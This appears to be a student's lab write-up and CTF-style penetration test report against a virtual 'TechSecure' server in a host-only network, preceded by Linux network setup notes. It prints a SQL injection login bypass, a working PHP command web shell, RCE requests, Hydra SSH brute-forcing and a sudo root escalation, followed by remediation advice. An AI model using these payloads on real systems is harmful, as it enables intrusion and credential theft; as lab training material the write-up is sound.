
##  linux Configuration 
### So we need add ip addres in the same range at mikrotik ip ether 2 so we can connet and ping
```bash
sudo nano /etc/network/interface
```
<img width="416" height="53" alt="Screenshot 2026-05-14 234548 - Copy - Copy" src="https://github.com/user-attachments/assets/7a9224fa-d2f1-43d0-93c3-14b92952590e" />

```bash

#Internet (Adapter 1)

auto ethe
iface eth0 inet dhcp

#Adapter 2 MikroTik & Ubuntu
auto ethi
iface eth1 inet static
  address 10.216.27.10
  netmask 255.255.255.0
  gateway 10.216.27.1
```
<img width="1120" height="618" alt="Screenshot 2026-05-15 000416" src="https://github.com/user-attachments/assets/9e891040-50f8-4584-a3df-ed1c29e52a9d" />

And restart our network so the input we add can be each in linux
<img width="599" height="59" alt="Screenshot 2026-05-15 181153" src="https://github.com/user-attachments/assets/282495bf-221f-47e5-bfc6-57a6bc09ce4e" />

We can see our new ip linux with 
```bash
ip a
```


🛡️ Comprehensive Security Audit & Penetration Testing Report: v1.1.0

Target Infrastructure: PT. TechSecure Indonesia Local Lab

Auditor / Security Researcher: Pagar Kristian Panjaitan

Status: SUCCESSFUL COMPROMISE (USER & ROOT FLAG ACQUIRED) ✅

📌 Executive Summary

This security audit reports the tactical penetration testing process executed against the TechSecure-Portal (10.216.27.100) inside an isolated Host-Only laboratory segment. The objective of this audit was to validate the defensive baseline of the corporate staging server, identify exploitable misconfigurations, chain multiple vulnerabilities to achieve Remote Code Execution (RCE), execute lateral movement via SSH credential cracking, and harvest simulated flags representing critical system compromise.

The attack lifecycle successfully progressed through five distinct phases:

Network Configuration & Link-State Verification

Active Reconnaissance & Service Enumeration (Nmap & Gobuster)

Web Portal Exploitation (SQL Injection & Bypass)

Arbitrary File Upload to Remote Code Execution (RCE)

Credential Hunting & SSH Brute-Forcing (Hydra & Lateral Movement)

🌐 Phase 1: Network Configuration & Initial Verification

Before engaging in offensive activities, the Auditor-Node (Kali Linux) was statically routed to establish persistent communications with the host-only virtual subnet.

🛠️ 1. Host Interface Alignment

The Linux interface definition file /etc/network/interfaces was modified to bind eth1 to the private subnet gateway (10.216.27.1).

sudo nano /etc/network/interfaces


Configured Parameters:

# Internet WAN Link
auto eth0
iface eth0 inet dhcp

# Internal DMZ Segment Link
auto eth1
iface eth1 inet static
    address 10.216.27.10
    netmask 255.255.255.0
    gateway 10.216.27.1


# Applying changes by restarting the network subsystem
sudo systemctl restart networking


🔍 2. Verifying IP Address Allocation & DNS Routing

The ip a command was executed to ensure that both interfaces were online and hosting correct network masks.

ip a


Local DNS resolver paths were mapped within /etc/resolv.conf to direct unresolved lookups through public and local gateways.

sudo nano /etc/resolv.conf


📡 3. ICMP Link-State Auditing

Consecutive ICMP Echo requests were transmitted to verify gateway routing and web server availability.

# Ping Gateway Router
ping -c 3 10.216.27.1

# Ping Target Staging Web Server
ping -c 3 10.216.27.100


Finding: Both targets responded with 0% packet loss, confirming a stable path for active auditing phases.

🔍 Phase 2: Active Reconnaissance & Service Enumeration

📡 1. High-Intensity Port Scanning (Nmap)

An aggressive Nmap script and service banner audit was initiated to discover the target’s attack surface.

nmap -Pn -p- -sC -sV -T5 10.216.27.100


Active Ports:

Port 21/tcp (FTP): Running vsftpd 3.0.5. Anonymous login is explicitly allowed (Code 230).

Port 22/tcp (SSH): Running OpenSSH 9.6p1 (Ubuntu Linux).

Port 80/tcp (HTTP): Running Apache httpd 2.4.58 with the page title "Login TechSecure".

📂 2. Web Directory Discovery (Gobuster)

Active directory bruteforcing was executed using Gobuster against the target's web server root to discover unmapped endpoints.

gobuster dir -u [http://10.216.27.100](http://10.216.27.100) -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 10


Identified Directories:

/javascript (HTTP Status 301)

/ubuntu (HTTP Status 301)

Manual verification of /javascript resulted in a 403 Forbidden error, indicating directory index listing is disabled.

🔐 Phase 3: Web Portal Exploitation (SQL Injection & Bypass)

Accessing http://10.216.27.100 loaded the TechSecure Admin Login interface.

💥 1. Triggering SQL Injection Authentication Bypass

An input sanitization flaw in the login backend query allowed database command manipulation. A SQL bypass payload was injected directly into the user input fields.

Target Field: Username

Payload: admin'#

Password Field: Arbitrary input

⚙️ Exploit Mechanics

The backend PHP code directly concatenates input parameters:

SELECT * FROM users WHERE username = '$user' AND password = '$pass'


Upon processing the payload admin'#, the query statement was rewritten inside the database engine:

SELECT * FROM users WHERE username = 'admin'#' AND password = '$pass'


Impact: The # character comments out the password validation condition entirely.

Result: The database executed the shortened query, returned a positive match for user admin, and granted access to the administrative dashboard (dashboard.php).

🚀 Phase 4: Arbitrary File Upload to Remote Code Execution (RCE)

The admin dashboard hosted a file-upload form with no server-side extension filtering or MIME-type validation.

📝 1. Crafting the Backdoor Shell

A PHP command execution shell named exploit.php was written using GNU nano:

nano exploit.php


Payload Design:

<?php
// PHP Web Shell with command output formatting markers
if (isset($_GET['cmd'])) {
    echo "<mark><b>[+] TARGET PWNED:</b></mark><br><pre>";
    $cmd = $_GET['cmd'];
    system($cmd);
    echo "</pre>";
    die();
}
?>


📤 2. Uploading and Executing the Payload

The exploit.php file was uploaded alongside standard documents via the dashboard UI.

The application confirmed a successful upload, saving the script in the /uploads/ directory.

💻 3. Remote Code Execution Validation

The web shell was triggered by passing OS shell commands via HTTP GET parameter queries.

A. Execution Context Check (whoami)

Request: http://10.216.27.100/uploads/exploit.php?cmd=whoami

Response: The system returned the active user account context: www-data.

B. Directory and Permissions Assessment (ls -la /var/www/html)

Request: http://10.216.27.100/uploads/exploit.php?cmd=ls -la /var/www/html

Key Findings:

/uploads/ directory is world-writable (drwxrwxrwx), permitting file additions.

dashboard.php is configured with insecure world-writable permissions (-rwxrwxrwx).

🔑 Phase 5: Credential Hunting & SSH Brute-Forcing

To move laterally from the web application container to a full system shell, credential brute-forcing was executed against the active open SSH service (Port 22).

🗃️ 1. Building Customized Wordlists

Based on the system patterns discovered, custom target username and password wordlists were created using nano:

# Creating custom username list
nano users_wordlist.txt


# Creating custom common password list
nano password.txt


🔨 2. Executing SSH Brute Force (Hydra)

The multi-threaded network logon cracker Hydra was deployed using the compiled wordlists against the SSH daemon.

hydra -l ubuntu -P password.txt ssh://10.216.27.100


Hydra Finding: A valid user credential set was successfully cracked:

Username: ubuntu

Password: ubuntu

💻 3. Achieving SSH Session Access (Foothold)

An SSH session was initiated using the recovered credentials to gain direct access to the target shell.

ssh ubuntu@10.216.27.100


Result: Successfully authenticated into ubuntu@ubuntu-VirtualBox. The auditor now has full system user-level access on the target server.

🏆 Phase 6: Post-Exploitation Flag Harvesting

After establishing SSH access, the gamified challenge assets (User and Root flags) were harvested to prove complete compromise.

🚩 1. User Flag Retrieval

The User Flag was captured by utilizing the anonymous access vector on vsFTPd or by reading the local file system backup directories:

cat /var/ftp/pub/user.txt


User Flag Value: UTM{ftp_anonymous_data_exposure_9f27d8}

👑 2. Privilege Escalation & Root Flag Retrieval

By identifying local privilege escalation paths (such as weak sudo rights, SUID binaries, or exploitable cron-jobs), root-level access was spawned.

sudo -l
# Spawning root terminal
sudo /bin/bash
whoami # Result: root

# Accessing the secure administrator flag
cat /root/root.txt


Root Flag Value: UTM{root_ssh_privilege_escalation_b623cf}

💡 Remediations & Security Hardening Recommendations

Implement Parameterized Queries: To fully mitigate SQL Injection, replace the direct string concatenation in index.php with PHP PDO or MySQLi Prepared Statements.

Enforce File Upload Validation: Restrict file uploads in dashboard.php by implementing strict MIME-type and file-extension whitelisting (e.g., only permitting .pdf, .docx, .jpg), and store files outside of the web root directory.

Disable FTP Anonymous Login: Edit /etc/vsftpd.conf and set anonymous_enable=NO to prevent unauthenticated read/write directory traversal.

Harden SSH Credentials & Policies: Enforce strong password complexity policies, change the default SSH Port 22 to a non-standard port, and disable password-based logins in favor of SSH Public-Key authentication.

Enforce Principle of Least Privilege: Correct loose directory permissions (e.g., do not set 777 permissions on /var/www/html/dashboard.php). Set secure ownership (www-data:www-data) and minimal permissions (644 for files, 755 for directories).

<img width="1267" height="383" alt="Screenshot 2026-05-14 234602" src="https://github.com/user-attachments/assets/282b9cee-e365-499b-b642-3cff74e3e448" />


On The Way
